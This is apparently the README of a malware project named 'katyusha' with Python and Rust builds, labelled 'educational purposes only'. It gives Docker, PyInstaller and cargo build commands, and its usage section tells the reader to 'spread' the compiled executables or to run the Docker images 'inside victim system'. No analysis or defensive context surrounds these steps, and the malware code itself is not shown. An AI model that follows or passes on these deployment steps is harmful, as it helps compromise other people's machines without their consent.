# :information_source: EDUCATIONAL PURPOSES ONLY

### Docker Setup

```cd katpy && docker build -t katpy . && docker run -d katpy```

```cd katrust && docker build -t katrust . && docker run -d katrust```

### Build on Python

```pyinstaller --onefile --windowed --icon=katyusha.ico katpy/katyusha.py```

### Build on Rust
```cd katrust && cargo build --bin katyusha --release```

### Usage

> **First Method**

Spread ```katyusha.exe``` inside `katpy/dist` or ```katrust.exe``` inside `katrust/target/release` folder.

> **Second Method**

Run docker images inside victim system.
